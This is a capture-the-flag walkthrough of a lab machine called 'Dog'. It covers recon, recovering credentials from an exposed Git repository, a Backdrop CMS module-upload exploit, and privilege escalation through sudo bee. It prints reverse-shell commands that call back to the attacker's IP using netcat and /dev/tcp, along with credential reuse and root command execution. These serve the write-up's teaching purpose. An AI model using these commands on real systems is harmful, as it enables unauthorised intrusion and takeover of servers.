# 🐶 Dog CTF - Walkthrough

## 🔍 Initial Reconnaissance

I started with an **Nmap** scan to identify open ports and active services on the target machine.

```bash
nmap -sC -sV -A 10.10.11.58
```

The results showed two open ports:

- **Port 22** → SSH
- **Port 80** → HTTP

During the scan, I noticed the presence of a `.git` folder, which suggested that the website might have an accessible Git repository.

## 📂 Git Repository Recovery

Using `git-dump`, I downloaded the content of the repository present in the `.git` folder.

Inside the repository, I found a `settings.php` file, which contained a **password**.

## 🔎 User Identification

After finding the password, I looked for a possible username. Exploring the website on port 80, I identified a username, but it was not associated with the password I found.

I noticed that user emails followed the format `@dog.htb`, so I performed a targeted search within the Git repository:

```bash
grep "@dog.htb" -r .
```

This search revealed the user **tiffany**. I tried to log in with the password found in `settings.php` and successfully gained access to the system.

## 🔥 Exploit for Backdrop CMS

After further analysis, I discovered that the website was using **Backdrop CMS**, and I found an exploit available on **Exploit-DB**:

🔗 [Backdrop CMS Exploit](https://www.exploit-db.com/exploits/52021)

This exploit allows you to create a custom module that enables arbitrary code execution.

To create the module, I used two files:

- `shell.info`
- `shell.php`

These files were compressed into a `.tar.gz` archive and uploaded to the CMS.

After installing the module, I navigated to the **modules** section and executed `shell.php`, obtaining bash command execution on the server.

## 🐚 Getting a Shell

To establish a **reverse shell**, I started a listener on my machine:

```bash
nc -lvnp 4444
```

And then, from the target server, I executed:

```bash
busybox nc 10.10.16.102 4444 -e sh
```

Once inside the machine, I improved the shell's interactivity with:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

I then looked for users present in the system:

```bash
cat /etc/passwd
```

I identified two users with an active shell, including **johncusack**. I tried to access via **SSH**:

```bash
ssh johncusack@10.10.11.58
```

Using the password found in `settings.php`, I was able to access the user **johncusack** and retrieve the **user.txt flag**.

## 🚀 Privilege Escalation

To check **sudo** permissions, I executed:

```bash
sudo -l
```

I discovered that the user **john** could execute the `bee` command, which allows **PHP** to be executed with elevated privileges.

After some research, I found that `bee` needed the path to **Backdrop CMS**, which was located at `/var/www/html`.

At this point, I executed from within the previously found path:

```bash
sudo bee php-eval 'echo(exec("cat /root/root.txt"))'
```

And I obtained the **root.txt flag**! 🏆

### 🔄 Alternative: Reverse Shell with Root Privileges

An alternative to obtaining a root shell would have been to execute:

```bash
sudo bee php-eval 'system("bash -c 'bash -i >& /dev/tcp/10.10.16.102/4444 0>&1'")'
```

## 🎯 Conclusion

This machine was an excellent challenge that required a mix of **enumeration techniques**, **Backdrop CMS exploit**, **reverse shell**, and **privilege escalation** with `bee`. 🚀